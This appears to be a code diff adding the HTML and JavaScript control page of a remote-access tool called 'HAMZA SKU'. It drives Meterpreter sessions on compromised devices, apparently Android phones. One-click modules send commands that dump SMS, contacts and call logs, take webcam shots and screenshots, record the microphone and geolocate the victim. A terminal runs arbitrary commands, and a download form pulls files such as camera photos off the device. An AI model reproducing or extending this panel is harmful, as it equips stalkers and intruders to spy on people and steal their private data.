@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HAMZA SKU - Session Control</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Cairo:wght@400;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif; background: #0a0e1a; color: #e0e6ed;
+            min-height: 100vh; padding: 20px;
+        }
+        
+        body::before {
+            content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px),
+                        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: gridMove 20s linear infinite; pointer-events: none; z-index: 0;
+        }
+        @keyframes gridMove { 0% { transform: translate(0,0); } 100% { transform: translate(50px,50px); } }
+        
+        .glow-orb {
+            position: fixed; width: 600px; height: 600px; border-radius: 50%;
+            filter: blur(100px); pointer-events: none; z-index: 1;
+            animation: orbFloat 20s ease-in-out infinite;
+        }
+        .glow-orb:nth-child(1) { top: -200px; right: -200px; 
+            background: radial-gradient(circle, rgba(0,255,136,0.2), transparent); }
+        .glow-orb:nth-child(2) { bottom: -200px; left: -200px; 
+            background: radial-gradient(circle, rgba(0,136,255,0.2), transparent); animation-delay: -10s; }
+        @keyframes orbFloat { 0%,100% { transform: translate(0,0); } 50% { transform: translate(50px,-50px); } }
+        
+        .container { max-width: 1800px; margin: 0 auto; position: relative; z-index: 10; }
+        
+        .header {
+            background: linear-gradient(135deg, rgba(20,24,36,0.95), rgba(14,18,30,0.9));
+            border: 1px solid rgba(0,255,136,0.3); border-radius: 20px; padding: 20px 30px;
+            margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center;
+        }
+        .session-info h1 {
+            font-family: 'Orbitron'; font-size: 28px; font-weight: 900;
+            background: linear-gradient(135deg, #00ff88, #0088ff);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin: 0 0 8px 0; letter-spacing: 2px;
+        }
+        .session-meta {
+            font-size: 13px; color: #8b95a8; font-family: 'JetBrains Mono';
+            display: flex; gap: 20px; align-items: center;
+        }
+        .meta-item {
+            display: flex; align-items: center; gap: 8px;
+        }
+        
+        .header-actions {
+            display: flex; gap: 12px;
+        }
+        .btn-small {
+            padding: 10px 18px; border: none; border-radius: 10px;
+            font-family: 'Orbitron'; font-size: 12px; font-weight: 700;
+            cursor: pointer; transition: 0.3s; text-decoration: none;
+            display: inline-flex; align-items: center; gap: 6px;
+        }
+        .btn-back {
+            background: linear-gradient(135deg, #0088ff, #0066cc); color: white;
+            box-shadow: 0 4px 15px rgba(0,136,255,0.4);
+        }
+        .btn-back:hover { transform: translateY(-2px); }
+        
+        .grid-2 {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .card {
+            background: rgba(20,24,36,0.95); border: 1px solid rgba(0,255,136,0.3);
+            border-radius: 18px; padding: 25px;
+        }
+        .card-title {
+            font-family: 'Orbitron'; font-size: 18px; color: #00ff88;
+            margin-bottom: 20px; display: flex; align-items: center; gap: 10px;
+            padding-bottom: 12px; border-bottom: 1px solid rgba(0,255,136,0.2);
+        }
+        
+        .quick-modules {
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px;
+        }
+        .module-btn {
+            padding: 14px; background: rgba(0,255,136,0.1);
+            border: 1px solid rgba(0,255,136,0.3); border-radius: 12px;
+            color: #00ff88; font-size: 13px; cursor: pointer;
+            transition: all 0.3s; font-family: 'Cairo'; font-weight: 700;
+            display: flex; align-items: center; gap: 10px;
+        }
+        .module-btn:hover {
+            background: linear-gradient(135deg, #00ff88, #00cc66);
+            color: #0a0e1a; transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,255,136,0.4);
+        }
+        
+        .terminal {
+            background: #000; border: 2px solid #00ff88; border-radius: 12px;
+            padding: 15px; height: 350px; overflow-y: auto;
+            font-family: 'JetBrains Mono'; font-size: 13px;
+            line-height: 1.6;
+        }
+        .terminal::-webkit-scrollbar { width: 8px; }
+        .terminal::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); }
+        .terminal::-webkit-scrollbar-thumb { background: #00ff88; border-radius: 4px; }
+        
+        .terminal-line {
+            color: #00ff88; margin-bottom: 4px;
+        }
+        .terminal-line.command { color: #0088ff; }
+        .terminal-line.error { color: #ff0055; }
+        
+        .command-input-group {
+            display: flex; gap: 10px; margin-top: 15px;
+        }
+        .command-input {
+            flex: 1; background: rgba(10,14,26,0.8);
+            border: 2px solid rgba(0,255,136,0.3); border-radius: 10px;
+            padding: 12px 15px; color: #e0e6ed;
+            font-family: 'JetBrains Mono'; font-size: 14px;
+        }
+        .command-input:focus {
+            outline: none; border-color: #00ff88;
+            box-shadow: 0 0 15px rgba(0,255,136,0.3);
+        }
+        .btn-execute {
+            padding: 12px 25px;
+            background: linear-gradient(135deg, #00ff88, #00cc66);
+            border: none; border-radius: 10px; color: #0a0e1a;
+            font-family: 'Orbitron'; font-size: 13px; font-weight: 700;
+            cursor: pointer; transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(0,255,136,0.4);
+        }
+        .btn-execute:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,255,136,0.6);
+        }
+        
+        .downloads-list {
+            max-height: 300px; overflow-y: auto;
+        }
+        .download-item {
+            background: rgba(0,255,136,0.05); border: 1px solid rgba(0,255,136,0.2);
+            border-radius: 10px; padding: 15px; margin-bottom: 12px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .file-info {
+            display: flex; align-items: center; gap: 12px;
+        }
+        .file-icon {
+            font-size: 24px;
+        }
+        .file-name {
+            font-family: 'JetBrains Mono'; font-size: 13px; color: #e0e6ed;
+        }
+        .file-time {
+            font-size: 11px; color: #8b95a8; margin-top: 4px;
+        }
+        .btn-download {
+            padding: 8px 16px;
+            background: rgba(0,136,255,0.2); border: 1px solid #0088ff;
+            border-radius: 8px; color: #0088ff; font-size: 12px;
+            cursor: pointer; transition: 0.3s; font-family: 'Cairo'; font-weight: 700;
+        }
+        .btn-download:hover {
+            background: #0088ff; color: white;
+        }
+        
+        .download-path-input {
+            display: flex; gap: 10px; margin-bottom: 20px;
+        }
+        .path-input {
+            flex: 1; background: rgba(10,14,26,0.8);
+            border: 2px solid rgba(0,136,255,0.3); border-radius: 10px;
+            padding: 12px 15px; color: #e0e6ed;
+            font-family: 'JetBrains Mono'; font-size: 13px;
+        }
+        .path-input:focus {
+            outline: none; border-color: #0088ff;
+            box-shadow: 0 0 15px rgba(0,136,255,0.3);
+        }
+        .btn-download-file {
+            padding: 12px 20px;
+            background: linear-gradient(135deg, #0088ff, #0066cc);
+            border: none; border-radius: 10px; color: white;
+            font-family: 'Orbitron'; font-size: 12px; font-weight: 700;
+            cursor: pointer; transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(0,136,255,0.4);
+        }
+        .btn-download-file:hover {
+            transform: translateY(-2px);
+        }
+        
+        .empty-downloads {
+            text-align: center; padding: 40px; color: #8b95a8;
+        }
+        .empty-icon {
+            font-size: 48px; margin-bottom: 15px; opacity: 0.3;
+        }
+    </style>
+</head>
+<body>
+    <div class="glow-orb"></div>
+    <div class="glow-orb"></div>
+    
+    <div class="container">
+        <div class="header">
+            <div class="session-info">
+                <h1>🎯 Session #<span id="sessionId">{{ session_id }}</span></h1>
+                <div class="session-meta">
+                    <div class="meta-item">
+                        <span>📍</span>
+                        <span id="sessionIP">Loading...</span>
+                    </div>
+                    <div class="meta-item">
+                        <span>💻</span>
+                        <span id="sessionPlatform">Loading...</span>
+                    </div>
+                    <div class="meta-item">
+                        <span>🌍</span>
+                        <span id="sessionCountry">Loading...</span>
+                    </div>
+                </div>
+            </div>
+            <div class="header-actions">
+                <a href="/dashboard" class="btn-small btn-back">⬅️ BACK</a>
+            </div>
+        </div>
+        
+        <div class="grid-2">
+            <div class="card">
+                <h3 class="card-title">
+                    <span>⚡</span>
+                    Quick Modules
+                </h3>
+                <div class="quick-modules">
+                    <button class="module-btn" onclick="quickCommand('sysinfo')">
+                        💻 System Info
+                    </button>
+                    <button class="module-btn" onclick="quickCommand('geolocate')">
+                        📍 Location
+                    </button>
+                    <button class="module-btn" onclick="quickCommand('screenshot')">
+                        📸 Screenshot
+                    </button>
+                    <button class="module-btn" onclick="quickCommand('webcam')">
+                        📷 Webcam
+                    </button>
+                    <button class="module-btn" onclick="quickCommand('dump_sms')">
+                        💬 Get SMS
+                    </button>
+                    <button class="module-btn" onclick="quickCommand('dump_contacts')">
+                        📞 Contacts
+                    </button>
+                    <button class="module-btn" onclick="quickCommand('dump_calllog')">
+                        📱 Call Log
+                    </button>
+                    <button class="module-btn" onclick="quickCommand('app_list')">
+                        📱 App List
+                    </button>
+                    <button class="module-btn" onclick="quickCommand('check_root')">
+                        🔓 Check Root
+                    </button>
+                    <button class="module-btn" onclick="quickCommand('record_mic')">
+                        🎙️ Record Mic
+                    </button>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h3 class="card-title">
+                    <span>📥</span>
+                    File Download
+                </h3>
+                <div class="download-path-input">
+                    <input type="text" class="path-input" id="downloadPath" 
+                           placeholder="/sdcard/DCIM/Camera/photo.jpg">
+                    <button class="btn-download-file" onclick="downloadFile()">
+                        📥 DOWNLOAD
+                    </button>
+                </div>
+                <div class="downloads-list" id="downloadsList">
+                    <div class="empty-downloads">
+                        <div class="empty-icon">📦</div>
+                        <p>No files downloaded yet</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h3 class="card-title">
+                <span>💻</span>
+                Command Terminal
+            </h3>
+            <div id="terminal" class="terminal">
+                <div class="terminal-line">HAMZA SKU Meterpreter Terminal</div>
+                <div class="terminal-line">Session: #{{ session_id }}</div>
+                <div class="terminal-line">Type commands or use Quick Modules above</div>
+                <div class="terminal-line">─────────────────────────────────────</div>
+            </div>
+            <div class="command-input-group">
+                <input type="text" class="command-input" id="commandInput" 
+                       placeholder="Enter command (e.g., sysinfo, ls, pwd)..."
+                       onkeypress="handleCommandKey(event)">
+                <button class="btn-execute" onclick="executeCommand()">
+                    ▶️ EXECUTE
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const sessionId = '{{ session_id }}';
+        const socket = io();
+        const downloads = [];
+        
+        // Load session info
+        async function loadSessionInfo() {
+            try {
+                const response = await fetch(`/api/session/${sessionId}/info`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('sessionIP').textContent = data.session.ip;
+                    document.getElementById('sessionPlatform').textContent = data.session.platform;
+                    document.getElementById('sessionCountry').textContent = data.session.country;
+                }
+            } catch (error) {
+                console.error('[-] Failed to load session info:', error);
+            }
+        }
+        
+        async function executeCommand() {
+            const input = document.getElementById('commandInput');
+            const command = input.value.trim();
+            
+            if (!command) return;
+            
+            addTerminalLine(`> ${command}`, 'command');
+            input.value = '';
+            
+            try {
+                const response = await fetch(`/api/session/${sessionId}/execute`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ command })
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    addTerminalLine(data.output || 'Command executed successfully');
+                } else {
+                    addTerminalLine(data.output || 'Command failed', 'error');
+                }
+            } catch (error) {
+                addTerminalLine(`Error: ${error}`, 'error');
+            }
+        }
+        
+        function quickCommand(type) {
+            const commands = {
+                'sysinfo': 'sysinfo',
+                'geolocate': 'run post/multi/gather/geolocate',
+                'screenshot': 'screenshot',
+                'webcam': 'webcam_snap',
+                'dump_sms': 'dump_sms',
+                'dump_contacts': 'dump_contacts',
+                'dump_calllog': 'dump_calllog',
+                'app_list': 'app_list',
+                'check_root': 'check_root',
+                'record_mic': 'record_mic -d 10'
+            };
+            
+            document.getElementById('commandInput').value = commands[type];
+            executeCommand();
+        }
+        
+        async function downloadFile() {
+            const path = document.getElementById('downloadPath').value.trim();
+            
+            if (!path) {
+                alert('Please enter a file path');
+                return;
+            }
+            
+            addTerminalLine(`> download ${path}`, 'command');
+            addTerminalLine('Downloading file...', 'info');
+            
+            try {
+                const response = await fetch(`/api/session/${sessionId}/download`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ path })
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    addTerminalLine(`✅ File downloaded: ${data.filename}`);
+                    
+                    // Add to downloads list
+                    downloads.push({
+                        filename: data.filename,
+                        url: data.download_url,
+                        time: new Date().toLocaleString()
+                    });
+                    updateDownloadsList();
+                } else {
+                    addTerminalLine(`❌ Download failed: ${data.error}`, 'error');
+                }
+            } catch (error) {
+                addTerminalLine(`❌ Error: ${error}`, 'error');
+            }
+        }
+        
+        function updateDownloadsList() {
+            const container = document.getElementById('downloadsList');
+            
+            if (downloads.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-downloads">
+                        <div class="empty-icon">📦</div>
+                        <p>No files downloaded yet</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            container.innerHTML = downloads.map(file => `
+                <div class="download-item">
+                    <div class="file-info">
+                        <span class="file-icon">📄</span>
+                        <div>
+                            <div class="file-name">${file.filename}</div>
+                            <div class="file-time">${file.time}</div>
+                        </div>
+                    </div>
+                    <a href="${file.url}" download>
+                        <button class="btn-download">📥 DOWNLOAD</button>
+                    </a>
+                </div>
+            `).join('');
+        }
+        
+        function addTerminalLine(text, type = '') {
+            const terminal = document.getElementById('terminal');
+            const line = document.createElement('div');
+            line.className = `terminal-line ${type}`;
+            line.textContent = text;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        function handleCommandKey(e) {
+            if (e.key === 'Enter') {
+                executeCommand();
+            }
+        }
+        
+        // Initial load
+        loadSessionInfo();
+    </script>
+</body>
+</html>
